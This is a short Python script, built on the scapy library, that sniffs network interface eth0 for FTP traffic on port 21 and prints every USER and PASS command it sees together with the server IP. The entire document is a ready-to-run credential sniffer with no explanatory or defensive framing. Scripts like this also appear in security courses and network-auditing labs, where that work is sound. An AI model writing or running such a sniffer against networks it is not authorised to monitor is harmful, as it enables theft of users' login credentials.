#!/usr/bin/python3

from scapy.all import *

def write_pkt(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].dport == 21:
            cmd = pkt.getlayer(Raw).load.decode('UTF-8')
            if cmd.startswith('USER') or cmd.startswith('PASS'):
                ip = pkt[IP].dst
                print('[+] {}: {}'.format(ip, cmd))

sniff(iface='eth0', prn=write_pkt, store=0)
